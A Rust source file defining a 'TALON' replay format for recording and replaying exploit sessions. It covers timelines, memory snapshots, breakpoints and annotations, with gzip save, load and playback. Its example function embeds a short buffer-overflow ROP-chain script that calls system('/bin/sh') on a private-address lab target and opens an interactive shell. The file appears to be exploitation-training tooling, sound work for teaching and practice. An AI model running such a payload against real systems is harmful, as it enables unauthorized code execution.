use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::Path;
use flate2::Compression;
use flate2::write::GzEncoder;
use flate2::read::GzDecoder;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TalonReplay {
    pub version: String,
    pub metadata: ReplayMetadata,
    pub session: SessionSnapshot,
    pub timeline: Vec<TimelineEvent>,
    pub binary_snapshot: Option<BinarySnapshot>,
    pub memory_snapshots: Vec<MemorySnapshot>,
    pub breakpoints: Vec<Breakpoint>,
    pub annotations: Vec<Annotation>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReplayMetadata {
    pub title: String,
    pub author: String,
    pub description: String,
    pub tags: Vec<String>,
    pub created_at: String,
    pub talon_version: String,
    pub target_binary: String,
    pub target_platform: String,
    pub difficulty_level: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionSnapshot {
    pub target_host: String,
    pub target_port: u16,
    pub script_content: String,
    pub variables: HashMap<String, String>,
    pub session_state: HashMap<String, String>,
    pub exploit_parameters: HashMap<String, String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TimelineEvent {
    pub timestamp: u64,
    pub event_type: EventType,
    pub description: String,
    pub code_line: Option<usize>,
    pub data: EventData,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum EventType {
    Connection,
    DataSent,
    DataReceived,
    BreakpointHit,
    MemoryRead,
    MemoryWrite,
    RegisterModified,
    FunctionCalled,
    ShellSpawned,
    ExploitSuccess,
    ExploitFailure,
    Annotation,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EventData {
    pub payload: Option<Vec<u8>>,
    pub address: Option<u64>,
    pub size: Option<usize>,
    pub register: Option<String>,
    pub value: Option<u64>,
    pub extra: HashMap<String, String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BinarySnapshot {
    pub binary_name: String,
    pub binary_hash: String,
    pub binary_data: Vec<u8>,
    pub architecture: String,
    pub protections: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MemorySnapshot {
    pub timestamp: u64,
    pub description: String,
    pub regions: Vec<MemoryRegion>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MemoryRegion {
    pub address: u64,
    pub size: usize,
    pub permissions: String,
    pub data: Vec<u8>,
    pub name: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Breakpoint {
    pub address: u64,
    pub enabled: bool,
    pub hit_count: usize,
    pub condition: Option<String>,
    pub description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Annotation {
    pub timestamp: u64,
    pub annotation_type: AnnotationType,
    pub content: String,
    pub code_line: Option<usize>,
    pub address: Option<u64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum AnnotationType {
    Note,
    Explanation,
    Warning,
    Tip,
    Highlight,
}

impl TalonReplay {
    pub fn new(title: &str, author: &str, description: &str) -> Self {
        TalonReplay {
            version: "1.0".to_string(),
            metadata: ReplayMetadata {
                title: title.to_string(),
                author: author.to_string(),
                description: description.to_string(),
                tags: Vec::new(),
                created_at: chrono::Utc::now().to_rfc3339(),
                talon_version: env!("CARGO_PKG_VERSION").to_string(),
                target_binary: String::new(),
                target_platform: String::new(),
                difficulty_level: "medium".to_string(),
            },
            session: SessionSnapshot {
                target_host: String::new(),
                target_port: 0,
                script_content: String::new(),
                variables: HashMap::new(),
                session_state: HashMap::new(),
                exploit_parameters: HashMap::new(),
            },
            timeline: Vec::new(),
            binary_snapshot: None,
            memory_snapshots: Vec::new(),
            breakpoints: Vec::new(),
            annotations: Vec::new(),
        }
    }

    pub fn add_event(&mut self, event_type: EventType, description: &str, data: EventData) {
        self.timeline.push(TimelineEvent {
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_millis() as u64,
            event_type,
            description: description.to_string(),
            code_line: None,
            data,
        });
    }

    pub fn add_annotation(&mut self, annotation_type: AnnotationType, content: &str) {
        self.annotations.push(Annotation {
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_millis() as u64,
            annotation_type,
            content: content.to_string(),
            code_line: None,
            address: None,
        });
    }

    pub fn capture_memory_snapshot(&mut self, description: &str, regions: Vec<MemoryRegion>) {
        self.memory_snapshots.push(MemorySnapshot {
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_millis() as u64,
            description: description.to_string(),
            regions,
        });
    }

    pub fn add_breakpoint(&mut self, address: u64, description: &str, condition: Option<String>) {
        self.breakpoints.push(Breakpoint {
            address,
            enabled: true,
            hit_count: 0,
            condition,
            description: description.to_string(),
        });
    }

    pub fn save(&self, path: &str) -> Result<(), String> {
        let json_data = serde_json::to_string_pretty(self)
            .map_err(|e| format!("Failed to serialize replay: {}", e))?;

        let file = File::create(path)
            .map_err(|e| format!("Failed to create file: {}", e))?;
        
        let mut encoder = GzEncoder::new(file, Compression::best());
        encoder.write_all(json_data.as_bytes())
            .map_err(|e| format!("Failed to write compressed data: {}", e))?;
        
        encoder.finish()
            .map_err(|e| format!("Failed to finalize compression: {}", e))?;

        Ok(())
    }

    pub fn load(path: &str) -> Result<Self, String> {
        if !Path::new(path).exists() {
            return Err(format!("Replay file not found: {}", path));
        }

        let file = File::open(path)
            .map_err(|e| format!("Failed to open file: {}", e))?;
        
        let mut decoder = GzDecoder::new(file);
        let mut json_data = String::new();
        decoder.read_to_string(&mut json_data)
            .map_err(|e| format!("Failed to decompress: {}", e))?;

        let replay: TalonReplay = serde_json::from_str(&json_data)
            .map_err(|e| format!("Failed to deserialize replay: {}", e))?;

        Ok(replay)
    }

    pub fn play(&self) -> Result<(), String> {
        println!("\n{}", "=".repeat(70));
        println!("TALON Replay: {}", self.metadata.title);
        println!("Author: {}", self.metadata.author);
        println!("Description: {}", self.metadata.description);
        println!("Created: {}", self.metadata.created_at);
        println!("{}", "=".repeat(70));

        println!("\nSession Information:");
        println!("  Target: {}:{}", self.session.target_host, self.session.target_port);
        println!("  Binary: {}", self.metadata.target_binary);
        println!("  Platform: {}", self.metadata.target_platform);

        println!("\nExploit Script:");
        println!("{}", "-".repeat(70));
        println!("{}", self.session.script_content);
        println!("{}", "-".repeat(70));

        println!("\nTimeline ({} events):", self.timeline.len());
        for (idx, event) in self.timeline.iter().enumerate() {
            println!("  [{}] {:?}: {}", idx + 1, event.event_type, event.description);
        }

        if !self.breakpoints.is_empty() {
            println!("\nBreakpoints:");
            for bp in &self.breakpoints {
                println!("  0x{:x}: {}", bp.address, bp.description);
            }
        }

        if !self.annotations.is_empty() {
            println!("\nAnnotations:");
            for ann in &self.annotations {
                println!("  [{:?}] {}", ann.annotation_type, ann.content);
            }
        }

        if !self.memory_snapshots.is_empty() {
            println!("\nMemory Snapshots: {}", self.memory_snapshots.len());
            for (idx, snapshot) in self.memory_snapshots.iter().enumerate() {
                println!("  [{}] {}: {} regions", idx + 1, snapshot.description, snapshot.regions.len());
            }
        }

        Ok(())
    }

    pub fn export_to_talon_script(&self, output_path: &str) -> Result<(), String> {
        let mut script = String::new();
        
        script.push_str(&format!("# {}\n", self.metadata.title));
        script.push_str(&format!("# Author: {}\n", self.metadata.author));
        script.push_str(&format!("# {}\n\n", self.metadata.description));

        script.push_str(&self.session.script_content);

        fs::write(output_path, script)
            .map_err(|e| format!("Failed to write script: {}", e))?;

        Ok(())
    }

    pub fn get_statistics(&self) -> ReplayStatistics {
        let total_bytes_sent = self.timeline.iter()
            .filter(|e| matches!(e.event_type, EventType::DataSent))
            .filter_map(|e| e.data.payload.as_ref().map(|p| p.len()))
            .sum();

        let total_bytes_received = self.timeline.iter()
            .filter(|e| matches!(e.event_type, EventType::DataReceived))
            .filter_map(|e| e.data.payload.as_ref().map(|p| p.len()))
            .sum();

        let breakpoint_hits = self.breakpoints.iter()
            .map(|b| b.hit_count)
            .sum();

        let memory_snapshots_total_size: usize = self.memory_snapshots.iter()
            .flat_map(|s| &s.regions)
            .map(|r| r.size)
            .sum();

        ReplayStatistics {
            total_events: self.timeline.len(),
            total_annotations: self.annotations.len(),
            total_breakpoints: self.breakpoints.len(),
            breakpoint_hits,
            memory_snapshots: self.memory_snapshots.len(),
            memory_snapshots_total_size,
            total_bytes_sent,
            total_bytes_received,
        }
    }
}

#[derive(Debug, Clone)]
pub struct ReplayStatistics {
    pub total_events: usize,
    pub total_annotations: usize,
    pub total_breakpoints: usize,
    pub breakpoint_hits: usize,
    pub memory_snapshots: usize,
    pub memory_snapshots_total_size: usize,
    pub total_bytes_sent: usize,
    pub total_bytes_received: usize,
}

pub fn create_example_replay() -> TalonReplay {
    let mut replay = TalonReplay::new(
        "Buffer Overflow ROP Chain Example",
        "TALON Team",
        "Demonstrates a classic buffer overflow with ROP chain exploitation"
    );

    replay.metadata.target_binary = "vuln_binary".to_string();
    replay.metadata.target_platform = "Linux x86_64".to_string();
    replay.metadata.tags = vec!["buffer-overflow".to_string(), "rop".to_string()];
    replay.metadata.difficulty_level = "medium".to_string();

    replay.session.target_host = "192.168.1.100".to_string();
    replay.session.target_port = 9999;
    replay.session.script_content = r#"let session = connect("192.168.1.100", 9999)
let offset = 112
let libc_base = 0x7ffff7a0d000
let system = libc_base + 0x4f440
let binsh = libc_base + 0x1b3e9a
let pop_rdi = libc_base + 0x2164f

let payload = cyclic(offset) + pack64(pop_rdi) + pack64(binsh) + pack64(system)
send(session, payload)
interactive(session)"#.to_string();

    replay.add_event(
        EventType::Connection,
        "Connected to target",
        EventData {
            payload: None,
            address: None,
            size: None,
            register: None,
            value: None,
            extra: HashMap::new(),
        }
    );

    replay.add_annotation(
        AnnotationType::Explanation,
        "Offset of 112 bytes found using cyclic pattern matching"
    );

    replay.add_breakpoint(0x400656, "Return from vulnerable function", None);

    replay
}
